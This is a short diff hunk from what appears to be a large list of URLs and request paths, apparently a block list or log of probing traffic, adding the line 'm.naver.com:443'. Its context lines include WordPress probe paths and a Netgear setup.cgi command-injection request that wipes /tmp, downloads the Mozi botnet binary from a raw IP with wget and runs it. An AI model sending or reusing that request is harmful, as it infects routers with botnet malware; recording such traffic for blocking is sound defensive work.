@@ -23615,3 +23615,4 @@ http://ipv4.icanhazip.com/
 /wp-includes/ID3/wp-error_log.php
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://27.157.144.49:59957/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /wp-content/plugins/revsliderswp/wp-login.php
+m.naver.com:443
